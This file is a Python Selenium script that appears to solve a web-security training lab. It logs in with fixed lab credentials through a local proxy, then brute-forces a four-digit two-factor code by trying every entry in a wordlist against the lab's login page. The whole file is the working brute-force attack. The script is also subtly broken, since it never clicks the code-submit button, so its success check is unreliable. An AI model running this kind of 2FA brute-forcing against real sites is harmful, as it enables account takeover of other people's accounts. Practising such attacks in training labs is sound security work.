#!/usr/bin/python3
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By

s = Service("./chromedriver")
proxy = "127.0.0.1:8080"
opt = webdriver.ChromeOptions()
opt.add_argument(f'--proxy-server={proxy}')
driver = webdriver.Chrome(service=s, chrome_options=opt)

with open('4digit.txt') as codes:
    for code in codes.readlines():
        driver.maximize_window()
        driver.get('https://0a9900a604e7fb5ec0296fa800bc008d.web-security-academy.net/login')

        xpath_login = "/html/body/div[2]/section/div/section/form/input[2]"
        xpath_passwd = "/html/body/div[2]/section/div/section/form/input[3]"
        xpath_submit = "/html/body/div[2]/section/div/section/form/button"
        xpath_code = "/html/body/div[2]/section/div/form/input[2]"
        xpath_submit_code = "/html/body/div[2]/section/div/form/button"

        driver.find_element(By.XPATH, xpath_login).send_keys('carlos')
        driver.find_element(By.XPATH, xpath_passwd).send_keys('montoya')
        driver.find_element(By.XPATH, xpath_submit).click()
        driver.find_element(By.XPATH, xpath_code).send_keys(code)

        body_text = driver.find_element(By.TAG_NAME, "body").text
        if 'Incorrect security code' not in body_text:
            print("Success", code)
            break
